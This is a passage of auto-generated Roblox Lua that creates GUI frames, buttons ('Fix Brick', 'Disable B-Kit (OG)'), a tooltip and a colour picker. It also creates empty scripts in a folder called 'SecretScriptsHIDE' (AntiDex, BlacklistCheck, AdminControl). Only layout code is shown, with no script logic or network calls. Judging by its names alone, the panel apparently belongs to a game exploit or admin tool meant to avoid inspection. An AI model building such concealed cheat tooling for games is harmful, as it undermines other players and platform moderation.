G2L["28f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["28f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28f"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.buttonFade.UIGradient
G2L["290"] = Instance.new("UIGradient", G2L["28f"]);
G2L["290"]["Rotation"] = 90;
G2L["290"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.outlineStroke
G2L["291"] = Instance.new("UIStroke", G2L["28e"]);
G2L["291"]["Thickness"] = 2;
G2L["291"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.text
G2L["292"] = Instance.new("TextLabel", G2L["28d"]);
G2L["292"]["ZIndex"] = 2;
G2L["292"]["BorderSizePixel"] = 0;
G2L["292"]["TextSize"] = 14;
G2L["292"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["292"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["292"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["292"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["292"]["BackgroundTransparency"] = 1;
G2L["292"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["292"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["292"]["Text"] = [[Fix Brick]];
G2L["292"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.text.text
G2L["293"] = Instance.new("UIStroke", G2L["292"]);
G2L["293"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.UIPadding
G2L["294"] = Instance.new("UIPadding", G2L["28d"]);
G2L["294"]["PaddingTop"] = UDim.new(0, 2);
G2L["294"]["PaddingRight"] = UDim.new(0, 3);
G2L["294"]["PaddingLeft"] = UDim.new(0, 3);
G2L["294"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.fillbar
G2L["295"] = Instance.new("Frame", G2L["28c"]);
G2L["295"]["ZIndex"] = 90;
G2L["295"]["BorderSizePixel"] = 0;
G2L["295"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["295"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["295"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["295"]["Name"] = [[fillbar]];
G2L["295"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick
G2L["296"] = Instance.new("Frame", G2L["24e"]);
G2L["296"]["BorderSizePixel"] = 0;
G2L["296"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["296"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["296"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["296"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["296"]["Name"] = [[restorebrick]];
G2L["296"]["LayoutOrder"] = 4;
G2L["296"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button
G2L["297"] = Instance.new("TextButton", G2L["296"]);
G2L["297"]["BorderSizePixel"] = 0;
G2L["297"]["TextTransparency"] = 1;
G2L["297"]["TextSize"] = 14;
G2L["297"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["297"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["297"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["297"]["ZIndex"] = 49;
G2L["297"]["BackgroundTransparency"] = 1;
G2L["297"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["297"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["297"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame
G2L["298"] = Instance.new("Frame", G2L["297"]);
G2L["298"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["298"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["298"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["298"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["298"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.buttonFade
G2L["299"] = Instance.new("CanvasGroup", G2L["298"]);
G2L["299"]["BorderSizePixel"] = 0;
G2L["299"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["299"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["299"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["299"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["299"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.buttonFade.UIGradient
G2L["29a"] = Instance.new("UIGradient", G2L["299"]);
G2L["29a"]["Rotation"] = 90;
G2L["29a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.outlineStroke
G2L["29b"] = Instance.new("UIStroke", G2L["298"]);
G2L["29b"]["Thickness"] = 2;
G2L["29b"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.text
G2L["29c"] = Instance.new("TextLabel", G2L["297"]);
G2L["29c"]["ZIndex"] = 2;
G2L["29c"]["BorderSizePixel"] = 0;
G2L["29c"]["TextSize"] = 14;
G2L["29c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29c"]["BackgroundTransparency"] = 1;
G2L["29c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["29c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29c"]["Text"] = [[Restore Brick]];
G2L["29c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.text.text
G2L["29d"] = Instance.new("UIStroke", G2L["29c"]);
G2L["29d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.UIPadding
G2L["29e"] = Instance.new("UIPadding", G2L["297"]);
G2L["29e"]["PaddingTop"] = UDim.new(0, 2);
G2L["29e"]["PaddingRight"] = UDim.new(0, 3);
G2L["29e"]["PaddingLeft"] = UDim.new(0, 3);
G2L["29e"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.fillbar
G2L["29f"] = Instance.new("Frame", G2L["296"]);
G2L["29f"]["ZIndex"] = 90;
G2L["29f"]["BorderSizePixel"] = 0;
G2L["29f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29f"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["29f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29f"]["Name"] = [[fillbar]];
G2L["29f"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog
G2L["2a0"] = Instance.new("Frame", G2L["24e"]);
G2L["2a0"]["BorderSizePixel"] = 0;
G2L["2a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a0"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["2a0"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["2a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a0"]["Name"] = [[disablebkitog]];
G2L["2a0"]["LayoutOrder"] = 4;
G2L["2a0"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button
G2L["2a1"] = Instance.new("TextButton", G2L["2a0"]);
G2L["2a1"]["BorderSizePixel"] = 0;
G2L["2a1"]["TextTransparency"] = 1;
G2L["2a1"]["TextSize"] = 14;
G2L["2a1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a1"]["ZIndex"] = 49;
G2L["2a1"]["BackgroundTransparency"] = 1;
G2L["2a1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a1"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame
G2L["2a2"] = Instance.new("Frame", G2L["2a1"]);
G2L["2a2"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2a2"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["2a2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a2"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2a2"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.buttonFade
G2L["2a3"] = Instance.new("CanvasGroup", G2L["2a2"]);
G2L["2a3"]["BorderSizePixel"] = 0;
G2L["2a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a3"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a3"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.buttonFade.UIGradient
G2L["2a4"] = Instance.new("UIGradient", G2L["2a3"]);
G2L["2a4"]["Rotation"] = 90;
G2L["2a4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.outlineStroke
G2L["2a5"] = Instance.new("UIStroke", G2L["2a2"]);
G2L["2a5"]["Thickness"] = 2;
G2L["2a5"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.text
G2L["2a6"] = Instance.new("TextLabel", G2L["2a1"]);
G2L["2a6"]["ZIndex"] = 2;
G2L["2a6"]["BorderSizePixel"] = 0;
G2L["2a6"]["TextSize"] = 14;
G2L["2a6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a6"]["BackgroundTransparency"] = 1;
G2L["2a6"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a6"]["Text"] = [[Disable B-Kit (OG)]];
G2L["2a6"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.text.text
G2L["2a7"] = Instance.new("UIStroke", G2L["2a6"]);
G2L["2a7"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.UIPadding
G2L["2a8"] = Instance.new("UIPadding", G2L["2a1"]);
G2L["2a8"]["PaddingTop"] = UDim.new(0, 2);
G2L["2a8"]["PaddingRight"] = UDim.new(0, 3);
G2L["2a8"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2a8"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.fillbar
G2L["2a9"] = Instance.new("Frame", G2L["2a0"]);
G2L["2a9"]["ZIndex"] = 90;
G2L["2a9"]["BorderSizePixel"] = 0;
G2L["2a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a9"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["2a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a9"]["Name"] = [[fillbar]];
G2L["2a9"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.UIListLayout
G2L["2aa"] = Instance.new("UIListLayout", G2L["24d"]);
G2L["2aa"]["Padding"] = UDim.new(0, 5);
G2L["2aa"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.greystroke
G2L["2ab"] = Instance.new("UIStroke", G2L["f"]);
G2L["2ab"]["ZIndex"] = 99;
G2L["2ab"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["2ab"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2ab"]["Name"] = [[greystroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.blackstroke
G2L["2ac"] = Instance.new("UIStroke", G2L["f"]);
G2L["2ac"]["Thickness"] = 2;
G2L["2ac"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2ac"]["Name"] = [[blackstroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.GuiColor
G2L["2ad"] = Instance.new("UIStroke", G2L["6"]);
G2L["2ad"]["ZIndex"] = 99;
G2L["2ad"]["Color"] = Color3.fromRGB(0, 124, 255);
G2L["2ad"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2ad"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.blackstroke
G2L["2ae"] = Instance.new("UIStroke", G2L["6"]);
G2L["2ae"]["Thickness"] = 2;
G2L["2ae"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2ae"]["Name"] = [[blackstroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.UIScale
G2L["2af"] = Instance.new("UIScale", G2L["6"]);



-- StarterGui.T5784YHRGE89ES98T.Color
G2L["2b0"] = Instance.new("Frame", G2L["1"]);
G2L["2b0"]["Visible"] = false;
G2L["2b0"]["BorderSizePixel"] = 0;
G2L["2b0"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["2b0"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["2b0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b0"]["Name"] = [[Color]];
G2L["2b0"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.Tooltip
G2L["2b1"] = Instance.new("Frame", G2L["1"]);
G2L["2b1"]["ZIndex"] = 1000000009;
G2L["2b1"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2b1"]["Size"] = UDim2.new(0, 100, 0, 20);
G2L["2b1"]["Position"] = UDim2.new(0.68056, 0, 0.81319, 0);
G2L["2b1"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2b1"]["Name"] = [[Tooltip]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipScript
G2L["2b2"] = Instance.new("LocalScript", G2L["2b1"]);
G2L["2b2"]["Name"] = [[tooltipScript]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipFade
G2L["2b3"] = Instance.new("CanvasGroup", G2L["2b1"]);
G2L["2b3"]["BorderSizePixel"] = 0;
G2L["2b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b3"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b3"]["Name"] = [[tooltipFade]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipFade.UIGradient
G2L["2b4"] = Instance.new("UIGradient", G2L["2b3"]);
G2L["2b4"]["Rotation"] = 90;
G2L["2b4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Tooltip.text
G2L["2b5"] = Instance.new("TextLabel", G2L["2b1"]);
G2L["2b5"]["TextWrapped"] = true;
G2L["2b5"]["ZIndex"] = 999999999;
G2L["2b5"]["BorderSizePixel"] = 0;
G2L["2b5"]["TextSize"] = 12;
G2L["2b5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b5"]["BackgroundTransparency"] = 1;
G2L["2b5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b5"]["Text"] = [[--]];
G2L["2b5"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.text.text
G2L["2b6"] = Instance.new("UIStroke", G2L["2b5"]);
G2L["2b6"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Tooltip.text.UIPadding
G2L["2b7"] = Instance.new("UIPadding", G2L["2b5"]);
G2L["2b7"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.Tooltip.UIScale
G2L["2b8"] = Instance.new("UIScale", G2L["2b1"]);



-- StarterGui.T5784YHRGE89ES98T.MasterScripts
G2L["2b9"] = Instance.new("Folder", G2L["1"]);
G2L["2b9"]["Name"] = [[MasterScripts]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ToggleMaster
G2L["2ba"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2ba"]["Name"] = [[ToggleMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ButtonMaster
G2L["2bb"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2bb"]["Name"] = [[ButtonMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.TextboxMaster
G2L["2bc"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2bc"]["Name"] = [[TextboxMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.SliderMaster
G2L["2bd"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2bd"]["Name"] = [[SliderMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.DropdownMaster
G2L["2be"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2be"]["Name"] = [[DropdownMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ColorPickerMaster
G2L["2bf"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2bf"]["Name"] = [[ColorPickerMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ChatMaster
G2L["2c0"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2c0"]["Name"] = [[ChatMaster]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.UserList
G2L["2c1"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2c1"]["Name"] = [[UserList]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.MAINCALLS
G2L["2c2"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2c2"]["Name"] = [[MAINCALLS]];


-- StarterGui.T5784YHRGE89ES98T.MasterScripts.Notif
G2L["2c3"] = Instance.new("LocalScript", G2L["2b9"]);
G2L["2c3"]["Name"] = [[Notif]];


-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE
G2L["2c4"] = Instance.new("Folder", G2L["1"]);
G2L["2c4"]["Name"] = [[SecretScriptsHIDE]];


-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AntiDex
G2L["2c5"] = Instance.new("LocalScript", G2L["2c4"]);
G2L["2c5"]["Name"] = [[AntiDex]];


-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.BlacklistCheck
G2L["2c6"] = Instance.new("LocalScript", G2L["2c4"]);
G2L["2c6"]["Name"] = [[BlacklistCheck]];


-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AdminControl
G2L["2c7"] = Instance.new("LocalScript", G2L["2c4"]);
G2L["2c7"]["Name"] = [[AdminControl]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker
G2L["2c8"] = Instance.new("Frame", G2L["1"]);
G2L["2c8"]["ZIndex"] = 1000000011;
G2L["2c8"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2c8"]["Size"] = UDim2.new(0, 200, 0, 270);
G2L["2c8"]["Position"] = UDim2.new(0.54615, 0, 0.6233, 0);
G2L["2c8"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2c8"]["Name"] = [[ColorPicker]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerScript
G2L["2c9"] = Instance.new("LocalScript", G2L["2c8"]);
G2L["2c9"]["Name"] = [[colorpickerScript]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout
G2L["2ca"] = Instance.new("Frame", G2L["2c8"]);
G2L["2ca"]["ZIndex"] = 99;
G2L["2ca"]["BorderSizePixel"] = 0;
G2L["2ca"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ca"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2ca"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ca"]["Name"] = [[innerframelayout]];
G2L["2ca"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.UIListLayout
G2L["2cb"] = Instance.new("UIListLayout", G2L["2ca"]);
G2L["2cb"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT
G2L["2cc"] = Instance.new("Frame", G2L["2ca"]);
G2L["2cc"]["BorderSizePixel"] = 0;
G2L["2cc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2cc"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["2cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2cc"]["Name"] = [[ACCENT]];
G2L["2cc"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT.GuiColor
G2L["2cd"] = Instance.new("Frame", G2L["2cc"]);
G2L["2cd"]["BorderSizePixel"] = 0;
G2L["2cd"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["2cd"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["2cd"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["2cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2cd"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.ACCENT.GuiColor.UICorner
G2L["2ce"] = Instance.new("UICorner", G2L["2cd"]);



-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text
G2L["2cf"] = Instance.new("TextLabel", G2L["2ca"]);
G2L["2cf"]["TextWrapped"] = true;
G2L["2cf"]["ZIndex"] = 999999999;
G2L["2cf"]["BorderSizePixel"] = 0;
G2L["2cf"]["TextSize"] = 12;
G2L["2cf"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2cf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2cf"]["BackgroundTransparency"] = 1;
G2L["2cf"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["2cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2cf"]["Text"] = [[--]];
G2L["2cf"]["LayoutOrder"] = 1;
G2L["2cf"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text.text
G2L["2d0"] = Instance.new("UIStroke", G2L["2cf"]);
G2L["2d0"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.text.UIPadding
G2L["2d1"] = Instance.new("UIPadding", G2L["2cf"]);
G2L["2d1"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue
G2L["2d2"] = Instance.new("Frame", G2L["2ca"]);
G2L["2d2"]["BorderSizePixel"] = 0;
G2L["2d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d2"]["Size"] = UDim2.new(1, 0, 0, 180);
G2L["2d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d2"]["Name"] = [[canvashue]];
G2L["2d2"]["LayoutOrder"] = 2;
G2L["2d2"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame
G2L["2d3"] = Instance.new("Frame", G2L["2d2"]);
G2L["2d3"]["BorderSizePixel"] = 0;
G2L["2d3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d3"]["Size"] = UDim2.new(1, -20, 1, 0);
G2L["2d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d3"]["Name"] = [[canvasFrame]];
G2L["2d3"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas
G2L["2d4"] = Instance.new("TextButton", G2L["2d3"]);
G2L["2d4"]["TextTransparency"] = 1;
G2L["2d4"]["TextSize"] = 14;
G2L["2d4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2d4"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2d4"]["Name"] = [[canvas]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot
G2L["2d5"] = Instance.new("Frame", G2L["2d4"]);
G2L["2d5"]["ZIndex"] = 999999999;
G2L["2d5"]["BorderSizePixel"] = 0;
G2L["2d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d5"]["Size"] = UDim2.new(0, 4, 0, 4);
G2L["2d5"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d5"]["Name"] = [[dot]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot.UICorner
G2L["2d6"] = Instance.new("UICorner", G2L["2d5"]);
G2L["2d6"]["CornerRadius"] = UDim.new(0, 999);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.canvas.dot.UIStroke
G2L["2d7"] = Instance.new("UIStroke", G2L["2d5"]);



-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.canvasFrame.UIPadding
G2L["2d8"] = Instance.new("UIPadding", G2L["2d3"]);
G2L["2d8"]["PaddingTop"] = UDim.new(0, 3);
